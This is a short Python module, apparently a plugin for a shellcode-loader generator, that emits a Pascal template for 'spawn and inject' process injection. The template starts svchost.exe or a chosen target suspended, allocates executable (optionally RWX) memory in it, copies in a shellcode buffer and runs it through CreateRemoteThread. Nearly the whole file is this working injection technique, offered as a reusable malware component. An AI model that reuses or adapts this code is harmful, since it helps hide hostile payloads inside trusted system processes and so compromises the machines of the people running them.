from string import Template

class spawnandinject:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

    def imports(self) -> list[str]:
        return ['Classes', 'windows', 'sysutils']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def apicalls(self) -> list[str]:
        return []

    def template(self) -> str:
        return Template("""
procedure main;
var
    pi: TProcessInformation;
    si: TStartupInfo;
    shellcode : array of byte;
    hThread: Handle;
    addr: LPVOID;

begin

    ZeroMemory(@si, SizeOf(si));
    si.cb := SizeOf(si);
    ZeroMemory(@pi, SizeOf(pi));

    CreateProcessA(nil, PAnsiChar('$target'), nil, nil, False, CREATE_SUSPENDED, nil, nil,  si, pi );

    
    {transformers}
    addr := VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, $memoryPermission);

    WriteProcessMemory(pi.hProcess, addr, @shellcode[0], {shellcodeSize}, nil);

    hThread := CreateRemoteThread(pi.hProcess, nil, 0, addr, nil, 0, nil);

    WaitForSingleObject(hThread, 500);
end;
""").substitute(target=self.target, memoryPermission=self.memoryPermission)